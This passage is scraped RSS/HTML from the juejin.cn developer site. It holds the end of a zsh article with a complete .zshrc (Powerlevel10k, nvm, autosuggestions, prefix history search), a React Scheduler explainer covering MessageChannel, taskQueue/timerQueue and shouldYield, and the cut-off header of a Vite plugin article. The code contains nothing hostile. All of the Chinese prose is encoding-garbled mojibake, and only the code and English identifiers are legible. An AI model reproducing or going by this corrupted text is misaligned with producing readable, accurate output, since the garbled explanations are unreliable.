<p><code>zsh-syntax-highlighting</code> <strong>å¿…é¡»æ˜¯æœ€ååŠ è½½çš„æ’ä»¶</strong>ã€‚</p>
</blockquote>
<p>å¦åˆ™ä¼šå‡ºç°ï¼š</p>
<ul>
<li>é«˜äº®å¤±æ•ˆ</li>
<li>ä¸å…¶ä»–æ’ä»¶å†²çª</li>
</ul>
<h2 data-id="heading-11">åä¸€ã€æœ€ç»ˆé…ç½®ï¼ˆå¯ç›´æ¥ä½¿ç”¨ï¼‰</h2>
<p>ä¸‹é¢æ˜¯ä¸€ä»½<strong>å®Œæ•´ã€å¯ç›´æ¥å¤åˆ¶ä½¿ç”¨çš„ <code>.zshrc</code> æœ€ç»ˆé…ç½®</strong>ã€‚</p>
<blockquote>
<p>è¯´æ˜ï¼š</p>
<ul>
<li>å·²åŒ…å« Powerlevel10k Instant Prompt</li>
<li>æ”¯æŒ <code>git commit</code> ç­‰å‘½ä»¤çš„ <strong>â†‘ / â†“ ä¸¥æ ¼å‰ç¼€å†å²æœç´¢</strong></li>
<li>è‡ªåŠ¨è”æƒ³ã€é«˜äº®ã€è¡¥å…¨é¡ºåºå…¨éƒ¨æ­£ç¡®</li>
<li>é€‚åˆé•¿æœŸä½œä¸ºä¸»åŠ›ç»ˆç«¯é…ç½®ä½¿ç”¨</li>
</ul>
</blockquote>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">########################################</span>
<span class="hljs-comment"># Powerlevel10k instant promptï¼ˆå¿…é¡»é å‰ï¼‰</span>
<span class="hljs-comment">########################################</span>
<span class="hljs-keyword">if</span> [[ -r <span class="hljs-string">"<span class="hljs-variable">${XDG_CACHE_HOME:-<span class="hljs-variable">$HOME</span>/.cache}</span>/p10k-instant-prompt-<span class="hljs-variable">${(%):-%n}</span>.zsh"</span> ]]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">source</span> <span class="hljs-string">"<span class="hljs-variable">${XDG_CACHE_HOME:-<span class="hljs-variable">$HOME</span>/.cache}</span>/p10k-instant-prompt-<span class="hljs-variable">${(%):-%n}</span>.zsh"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment">########################################</span>
<span class="hljs-comment"># åŸºç¡€ç¯å¢ƒ</span>
<span class="hljs-comment">########################################</span>
<span class="hljs-built_in">export</span> NVM_DIR=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.nvm"</span>
[ -s <span class="hljs-string">"/opt/homebrew/opt/nvm/nvm.sh"</span> ] &amp;&amp; . <span class="hljs-string">"/opt/homebrew/opt/nvm/nvm.sh"</span>

<span class="hljs-comment"># Powerlevel10k ä¸»é¢˜</span>
<span class="hljs-built_in">source</span> /opt/homebrew/share/powerlevel10k/powerlevel10k.zsh-theme
[[ -f ~/.p10k.zsh ]] &amp;&amp; <span class="hljs-built_in">source</span> ~/.p10k.zsh

<span class="hljs-comment"># PATH å»é‡</span>
<span class="hljs-built_in">typeset</span> -U PATH path

<span class="hljs-comment">########################################</span>
<span class="hljs-comment"># Zsh è¡¥å…¨ç³»ç»Ÿ</span>
<span class="hljs-comment">########################################</span>
<span class="hljs-built_in">autoload</span> -Uz compinit
compinit -d ~/.zcompdump

<span class="hljs-comment">########################################</span>
<span class="hljs-comment"># å†å²è¡Œä¸ºä¼˜åŒ–</span>
<span class="hljs-comment">########################################</span>
<span class="hljs-built_in">setopt</span> HIST_IGNORE_ALL_DUPS
<span class="hljs-built_in">setopt</span> HIST_REDUCE_BLANKS
<span class="hljs-built_in">setopt</span> INC_APPEND_HISTORY
<span class="hljs-built_in">setopt</span> SHARE_HISTORY

<span class="hljs-comment">########################################</span>
<span class="hljs-comment"># è‡ªåŠ¨è”æƒ³ï¼ˆç°è‰²æç¤ºï¼‰</span>
<span class="hljs-comment">########################################</span>
ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE=<span class="hljs-string">'fg=8'</span>
<span class="hljs-built_in">source</span> /opt/homebrew/share/zsh-autosuggestions/zsh-autosuggestions.zsh

<span class="hljs-comment">########################################</span>
<span class="hljs-comment"># â†‘ / â†“ å‰ç¼€å†å²æœç´¢ï¼ˆgit commit å‹å¥½ï¼‰</span>
<span class="hljs-comment">########################################</span>
<span class="hljs-built_in">bindkey</span> -M emacs <span class="hljs-string">'^[[A'</span> history-beginning-search-backward
<span class="hljs-built_in">bindkey</span> -M emacs <span class="hljs-string">'^[[B'</span> history-beginning-search-forward

<span class="hljs-comment">########################################</span>
<span class="hljs-comment"># è¯­æ³•é«˜äº®ï¼ˆå¿…é¡»æ”¾æœ€åï¼‰</span>
<span class="hljs-comment">########################################</span>
<span class="hljs-built_in">source</span> /opt/homebrew/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
</code></pre>
<h2 data-id="heading-12">åäºŒã€æœ€ç»ˆæ•ˆæœæ€»ç»“</h2>
<p>ä½¿ç”¨è¿™ä»½é…ç½®ï¼Œä½ ä¼šå¾—åˆ°ï¼š</p>
<ul>
<li><strong>å¯åŠ¨å¿«ã€ä¸é—ªå±</strong>ï¼ˆPowerlevel10k Instant Promptï¼‰</li>
<li><strong>è¡¥å…¨ç¨³å®š</strong>ï¼ˆcompinit é¡ºåºæ­£ç¡®ï¼‰</li>
<li><strong>å†å²æœç´¢ç²¾å‡†</strong>ï¼ˆå‰ç¼€åŒ¹é…ï¼‰</li>
<li><strong>è‡ªåŠ¨è”æƒ³ä¸å¹²æ‰°æ“ä½œ</strong></li>
</ul>
<p>è¿™ä¸æ˜¯â€œç‚«æŠ€å‹é…ç½®â€ï¼Œè€Œæ˜¯ï¼š</p>
<blockquote>
<p><strong>é€‚åˆé•¿æœŸä½¿ç”¨çš„å·¥ç¨‹å¸ˆç»ˆç«¯åŸºå»ºã€‚</strong></p>
</blockquote>
<h2 data-id="heading-13">ç»“è¯­</h2>
<p>ç»ˆç«¯é…ç½®çš„ä»·å€¼ï¼Œä¸åœ¨äºä½ ç”¨äº†å¤šå°‘æ’ä»¶ï¼Œè€Œåœ¨äºï¼š</p>
<ul>
<li>æ˜¯å¦å‡å°‘äº†æ— æ„ä¹‰çš„æ“ä½œ</li>
<li>æ˜¯å¦è®©é«˜é¢‘è¡Œä¸ºå˜æˆè‚Œè‚‰è®°å¿†</li>
</ul>
<p>å¦‚æœä½ æ¯å¤©è¦æ•²å‡ åæ¬¡ <code>git commit</code>ï¼Œ
é‚£ä¹ˆè®© â†‘ é”®â€œåªåšæ­£ç¡®çš„äº‹â€ï¼Œæœ¬èº«å°±å·²ç»éå¸¸å€¼å¾—äº†ã€‚</p>
<blockquote>
<p>åç»­å¯ä»¥ç»§ç»­è¿›é˜¶çš„æ–¹å‘ï¼š</p>
<ul>
<li>NVM lazy loadï¼ˆç§’å¼€ç»ˆç«¯ï¼‰</li>
<li>Git / pnpm ä¸“ç”¨å¿«æ·é”®</li>
<li>ZLE Widget æ·±åº¦å®šåˆ¶</li>
</ul>
</blockquote>
<p>è¿™äº›ï¼Œéƒ½å¯ä»¥åœ¨è¿™ä»½é…ç½®ä¹‹ä¸Šè‡ªç„¶æ¼”è¿›ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React-Scheduler è°ƒåº¦å™¨å¦‚ä½•æŒæ§ä¸»çº¿ç¨‹ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7600787795477364782</link>    <guid>https://juejin.cn/post/7600787795477364782</guid>    <pubDate>2026-01-30T09:21:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600787795477364782" data-draft-id="7600990891206475803" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React-Scheduler è°ƒåº¦å™¨å¦‚ä½•æŒæ§ä¸»çº¿ç¨‹ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,React.js"/> <meta itemprop="datePublished" content="2026-01-30T09:21:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‘ç°ä¸€åªå¤§å‘†ç“œ"/> <meta itemprop="url" content="https://juejin.cn/user/180747382561607"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React-Scheduler è°ƒåº¦å™¨å¦‚ä½•æŒæ§ä¸»çº¿ç¨‹ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/180747382561607/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‘ç°ä¸€åªå¤§å‘†ç“œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:21:35.000Z" title="Fri Jan 30 2026 09:21:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">å‰è¨€</h3>
<p>åœ¨ React 18 çš„å¹¶å‘æ—¶ä»£ï¼Œ<code>Schedulerï¼ˆè°ƒåº¦å™¨ï¼‰</code> æ˜¯å®ç°éé˜»å¡æ¸²æŸ“çš„å¹•åè‹±é›„ã€‚å®ƒä¸åªæ˜¯ React çš„ä¸€ä¸ªæ¨¡å—ï¼Œæ›´æ˜¯ä¸€ä¸ªé€šç”¨çš„ã€é«˜æ€§èƒ½çš„ JavaScript ä»»åŠ¡è°ƒåº¦åº“ã€‚å®ƒä¸ä»…è®© React ä»»åŠ¡å¯ä»¥â€œæ’é˜Ÿâ€ï¼Œè¿˜è®©â€œé•¿ä»»åŠ¡â€ä¸å†é˜»å¡æµè§ˆå™¨ UI æ¸²æŸ“ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€ æ ¸å¿ƒæ¦‚å¿µï¼šä»€ä¹ˆæ˜¯ Schedulerï¼Ÿ</h2>
<p>Scheduler æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„åŒ…ï¼Œå®ƒé€šè¿‡ä¸ React åè°ƒè¿‡ç¨‹ï¼ˆReconciliationï¼‰çš„ç´§å¯†é…åˆï¼Œå®ç°äº†ä»»åŠ¡çš„<strong>å¯ä¸­æ–­ã€å¯æ¢å¤ã€å¸¦ä¼˜å…ˆçº§</strong>æ‰§è¡Œã€‚</p>
<h3 data-id="heading-2">ä¸»è¦èŒè´£</h3>
<ol>
<li><strong>ä¼˜å…ˆçº§ç®¡ç†</strong>ï¼šæ ¹æ®ä»»åŠ¡ç´§æ€¥ç¨‹åº¦ï¼ˆå¦‚ç”¨æˆ·ç‚¹å‡» vs æ•°æ®é¢„å–ï¼‰å®‰æ’æ‰§è¡Œé¡ºåºã€‚</li>
<li><strong>ç©ºé—²æ—¶é—´åˆ©ç”¨</strong>ï¼šåœ¨æµè§ˆå™¨æ¯ä¸€å¸§çš„ç©ºé—²æ—¶é—´å¤„ç†ä¸ç´§æ€¥çš„ä»»åŠ¡ã€‚</li>
<li><strong>é˜²æ­¢ä¸»çº¿ç¨‹é˜»å¡</strong>ï¼šé€šè¿‡â€œæ—¶é—´ç‰‡ï¼ˆTime Slicingï¼‰â€æœºåˆ¶ï¼Œé¿å…é•¿ä»»åŠ¡å¯¼è‡´é¡µé¢å‡æ­»ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-3">äºŒã€ Scheduler çš„å®Œæ•´è°ƒåº¦é“¾è·¯</h2>
<p>å½“ä¸€ä¸ª <code>setState</code> è§¦å‘åï¼ŒScheduler å†…éƒ¨ä¼šç»å†ä»¥ä¸‹ç²¾å¯†æµç¨‹ï¼š</p>
<h3 data-id="heading-4">1. ä»»åŠ¡åˆ›å»ºä¸é€šçŸ¥</h3>
<p>å½“çŠ¶æ€æ›´æ–°æ—¶ï¼ŒReact ä¸ä¼šç«‹å³æ‰§è¡Œ Renderã€‚å®ƒé¦–å…ˆä¼šåˆ›å»ºä¸€ä¸ª <code>Update</code>å¯¹è±¡æ¥è®°å½•è¿™æ¬¡å˜æ›´ï¼Œè¿™ä¸ªå¯¹è±¡ä¸­åŒ…å«è¿™æ¬¡æ›´æ–°æ‰€éœ€çš„å…¨éƒ¨ä¿¡æ¯ï¼Œä¾‹å¦‚æ›´æ–°åçš„çŠ¶æ€å€¼ï¼Œ<code>Lane</code>è½¦é“æ¨¡å‹åˆ†é…çš„ä»»åŠ¡ä¼˜å…ˆçº§.</p>
<h3 data-id="heading-5">2. ä¼˜å…ˆçº§æ’åºä¸é˜Ÿåˆ—ç»´æŠ¤</h3>
<ul>
<li>
<p><strong>ä»»åŠ¡ä¼˜å…ˆçº§æ’åº</strong>ï¼š åˆ›å»ºæ›´æ–°åï¼Œreactä¼šè°ƒç”¨<code>scheduleUpdateOnFiber</code>å‡½æ•°é€šçŸ¥<code>scheduler</code>è°ƒåº¦å™¨æœ‰ä¸ªä¸€ä¸ªæ–°çš„ä»»åŠ¡éœ€è¦è°ƒåº¦ï¼Œè¿™æ—¶<code>scheduler</code>ä¼šå¯¹è¯¥ä»»åŠ¡ç¡®å®šä¸€ä¸ªä¼˜å…ˆçº§ï¼Œä»¥åŠè¿‡æœŸæ—¶é—´ï¼ˆä¼˜å…ˆçº§è¶Šé«˜ï¼Œè¿‡æœŸæ—¶é—´è¶ŠçŸ­ï¼Œè¡¨ç¤ºè¶Šç´§æ€¥ï¼‰</p>
</li>
<li>
<p><strong>é˜Ÿåˆ—ç»´æŠ¤</strong>ï¼š æ¥ç€<code>scheduler</code>ä¼šå°†è¯¥ä»»åŠ¡æ”¾å…¥åˆ°å¾ªç¯è°ƒåº¦ä¸­ï¼Œ<code>scheduler</code>å¯¹äºä»»åŠ¡å¾ªç¯è°ƒåº¦åœ¨å†…éƒ¨ç»´æŠ¤ç€ä¸¤ä¸ªé˜Ÿåˆ—ï¼Œä¸€ä¸ªæ˜¯ç«‹å³æ‰§è¡Œé˜Ÿåˆ—<code>taskQueue</code>å’Œå»¶è¿Ÿä»»åŠ¡é˜Ÿåˆ—<code>timeQueue</code>ï¼Œæ–°ä»»åŠ¡ä¼šæ ¹æ®ä¼˜å…ˆçº§è¿›å…¥åˆ°ç›¸åº”å¯¹åˆ—</p>
<ul>
<li><strong><code>timerQueue</code>ï¼ˆå»¶æ—¶ä»»åŠ¡é˜Ÿåˆ—ï¼‰</strong> ï¼šå­˜æ”¾è¿˜æœªåˆ°å¼€å§‹æ—¶é—´çš„ä»»åŠ¡ï¼ŒæŒ‰å¼€å§‹æ—¶é—´æ’åºã€‚</li>
<li><strong><code>taskQueue</code>ï¼ˆç«‹å³ä»»åŠ¡é˜Ÿåˆ—ï¼‰</strong> ï¼šå­˜æ”¾å·²ç»å°±ç»ªçš„ä»»åŠ¡ï¼ŒæŒ‰<strong>è¿‡æœŸæ—¶é—´</strong>æ’åºã€‚ä¼˜å…ˆçº§è¶Šé«˜ï¼Œè¿‡æœŸæ—¶é—´è¶ŠçŸ­ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-6">3. æ—¶é—´ç‰‡çš„å¼€å¯ï¼šMessageChannel</h3>
<p>å°†ä»»åŠ¡æ”¾å…¥é˜Ÿåˆ—åï¼Œ<code>scheduler</code>ä¼šè°ƒç”¨<code>requetHostCallback</code>å‡½æ•°å»è¯·æ±‚æµè§ˆå™¨åœ¨åˆé€‚çš„æ—¶æœºå»æ‰§è¡Œè°ƒåº¦ï¼Œè¯¥å‡½æ•°é€šè¿‡ <code>MessageChannel</code>å¯¹è±¡ä¸­çš„<code>port.postMessage</code> æ–¹æ³•åˆ›å»ºä¸€ä¸ªå®ä»»åŠ¡ï¼Œæµè§ˆå™¨åœ¨ä¸‹ä¸€ä¸ªå®ä»»åŠ¡æ—¶æœºè§¦å‘ <code>port.onmessage</code>ï¼Œå¹¶åœ¨è¿™å®ä»»åŠ¡å›è°ƒä¸­å¯åŠ¨ <code>workLoop</code>å‡½æ•°ã€‚</p>
<blockquote>
<p>è¡¥å……ï¼šScheduler ä¼šè°ƒç”¨ <code>requestHostCallback</code> è¯·æ±‚æµè§ˆå™¨è°ƒåº¦ã€‚å®ƒæ²¡æœ‰é€‰æ‹© <code>setTimeout</code>ï¼Œè€Œæ˜¯é€‰æ‹©äº† <strong><code>MessageChannel</code></strong>ã€‚</p>
</blockquote>
<blockquote>
<p><strong>ä¸ºä»€ä¹ˆé€‰ MessageChannelï¼Ÿ</strong> <code>setTimeout(fn, 0)</code> åœ¨æµè§ˆå™¨ä¸­é€šå¸¸æœ‰ 4ms çš„æœ€å°å»¶è¿Ÿï¼Œä¸”å±äºå®ä»»åŠ¡ä¸­æ‰§è¡Œæ—¶æœºè¾ƒæ™šçš„ã€‚<code>MessageChannel</code> çš„ <code>port.postMessage</code> äº§ç”Ÿçš„å®ä»»åŠ¡æ‰§è¡Œæ—¶æœºæ›´æ—©ï¼Œä¸”èƒ½æ›´ç²¾å‡†åœ°åœ¨æµè§ˆå™¨æ¸²æŸ“å¸§ä¹‹é—´åˆ‡å…¥ã€‚</p>
</blockquote>
<h3 data-id="heading-7">4. å·¥ä½œå¾ªç¯ï¼šworkLoop</h3>
<ul>
<li>
<p>åœ¨å®ä»»åŠ¡å›è°ƒä¸­ï¼Œè°ƒåº¦å™¨ä¼šè¿›å…¥ <code>workLoop</code>ã€‚å®ƒä¼šè°ƒç”¨<code>performUnitOfWor</code>kå‡½æ•°å¾ªç¯åœ°å¤„ç†FiberèŠ‚ç‚¹ï¼Œå¯¹æ¯”æ–°æ—§èŠ‚ç‚¹çš„<code>propsã€state</code>ï¼Œå¹¶ä»é˜Ÿåˆ—ä¸­å–å‡ºæœ€ç´§æ€¥çš„ä»»åŠ¡äº¤ç»™ React æ‰§è¡Œã€‚</p>
</li>
<li>
<p><code>workLopp</code>ä¸­ä¼šåŒ…å«ä¸€ä¸ª<code>shouldYield</code>å‡½æ•°ä¸­æ–­æ£€æŸ¥å‡½æ•°ï¼Œç”¨äºæ£€æŸ¥å½“å‰æ—¶é—´ç‰‡æ˜¯å¦è€—å°½ä»¥åŠæ˜¯å¦æœ‰æ›´é«˜ä¼˜å…ˆçº§çš„ä»»åŠ¡æ‰§è¡Œï¼Œå¦‚æœæœ‰çš„è¯åˆ™ä¼šå°†ä¸»çº¿ç¨‹æ§åˆ¶æƒäº¤è¿˜ç»™æµè§ˆå™¨ï¼Œä»¥ä¿è¯é«˜ä¼˜å…ˆçº§ä»»åŠ¡ï¼ˆå¦‚ç”¨æˆ·è¾“å…¥ã€åŠ¨ç”»ï¼‰èƒ½åŠæ—¶å“åº”ã€‚</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-8">5. ä¸­æ–­ä¸æ¢å¤ï¼šshouldYield çš„é­”åŠ›</h3>
<p>åœ¨ <code>workLoop</code> æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæ¯ä¸€é¡¹å•å…ƒå·¥ä½œå®Œæˆåï¼Œéƒ½ä¼šè°ƒç”¨ <strong><code>shouldYield()</code></strong> å‡½æ•°è¿›è¡Œâ€œè·¯å†µæ£€æŸ¥â€ã€‚</p>
<ul>
<li><strong>ä¸­æ–­æ¡ä»¶</strong>ï¼šå¦‚æœå½“å‰æ—¶é—´ç‰‡ï¼ˆé€šå¸¸ä¸º <strong>5ms</strong>ï¼‰è€—å°½ï¼Œæˆ–è€…æ£€æµ‹åˆ°æœ‰æ›´ç´§æ€¥çš„ç”¨æˆ·äº¤äº’ï¼ˆé«˜ä¼˜ä»»åŠ¡æ’é˜Ÿï¼‰ï¼Œ<code>shouldYield</code> è¿”å› <code>true</code>ã€‚</li>
<li><strong>çŠ¶æ€ä¿å­˜</strong>ï¼šæ­¤æ—¶ React ä¼šè®°å½•å½“å‰ <code>workInProgress</code> æ ‘çš„ä½ç½®ï¼Œå°†æ§åˆ¶æƒäº¤è¿˜ç»™æµè§ˆå™¨ã€‚</li>
<li><strong>ä»»åŠ¡æ¢å¤</strong>ï¼šScheduler ä¼šåœ¨ä¸‹ä¸€ä¸ªæ—¶é—´ç‰‡é€šè¿‡ <code>MessageChannel</code> å†æ¬¡è§¦å‘ï¼Œä»è®°å½•çš„ä½ç½®ç»§ç»­æ‰§è¡Œï¼Œä»è€Œå®ç°å¯æ¢å¤ã€‚</li>
</ul>
<h3 data-id="heading-9">6. ä»»åŠ¡æ’é˜Ÿ</h3>
<p>å¦‚æœåœ¨æ‰§è¡Œä¸€ä¸ªä½ä¼˜å…ˆçº§ä»»åŠ¡æ—¶ï¼Œæœ‰é«˜ä¼˜å…ˆçº§ä»»åŠ¡åŠ å…¥ï¼ˆå¦‚ç”¨æˆ·çªç„¶ç‚¹å‡»æŒ‰é’®ï¼‰ï¼Œ<code>Scheduler</code>ä¼šä¸­æ–­å½“å‰çš„ä½ä¼˜ä»»åŠ¡å¹¶è®°å½•è¯¥ä½ç½®ï¼Œå…ˆæ‰§è¡Œé«˜ä¼˜ä»»åŠ¡ã€‚ç­‰é«˜ä¼˜ä»»åŠ¡å®Œæˆåï¼Œå†é‡æ–°æ‰§è¡Œæˆ–ç»§ç»­ä¹‹å‰çš„ä½ä¼˜ä»»åŠ¡</p>
<hr/>
<h2 data-id="heading-10">ä¸‰ã€ è¡¥å……</h2>
<ol>
<li><strong>æ‰§è¡Œæ—¶æœºå¯¹æ¯”</strong>ï¼š<code>MessageChannel</code> ç¡®å®åœ¨å®ä»»åŠ¡ä¸­éå¸¸å¿«ï¼Œä½†åœ¨æŸäº›æå…¶ç‰¹æ®Šçš„æƒ…å†µä¸‹ï¼ˆå¦‚æ²¡æœ‰ <code>MessageChannel</code> çš„æ—§ç¯å¢ƒï¼‰ï¼Œå®ƒä¼šå›é€€åˆ° <code>setTimeout</code>ã€‚</li>
<li><strong>é¥¥é¥¿ç°è±¡é˜²æ­¢</strong>ï¼šå¦‚æœä¸€ä¸ªä½ä¼˜å…ˆçº§ä»»åŠ¡ä¸€ç›´è¢«æ’é˜Ÿæ€ä¹ˆåŠï¼ŸScheduler é€šè¿‡<strong>è¿‡æœŸæ—¶é—´</strong>è§£å†³ã€‚ä¸€æ—¦ä»»åŠ¡è¿‡æœŸï¼Œå®ƒä¼šä» <code>taskQueue</code> ä¸­è¢«æå‡ä¸ºåŒæ­¥ä»»åŠ¡ï¼Œå¼ºåˆ¶æ‰§è¡Œã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€ä¸ªViteæ’ä»¶å®ç°PCåˆ°ç§»åŠ¨ç«¯é¡¹ç›®çš„é«˜æ•ˆè¿ç§»æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7600868443832254483</link>    <guid>https://juejin.cn/post/7600868443832254483</guid>    <pubDate>2026-01-30T09:24:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600868443832254483" data-draft-id="7600967006892752905" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€ä¸ªViteæ’ä»¶å®ç°PCåˆ°ç§»åŠ¨ç«¯é¡¹ç›®çš„é«˜æ•ˆè¿ç§»æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Vite"/> <meta itemprop="datePublished" content="2026-01-30T09:24:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æµ®å¹»äº‘æœˆ"/> <meta itemprop="url" 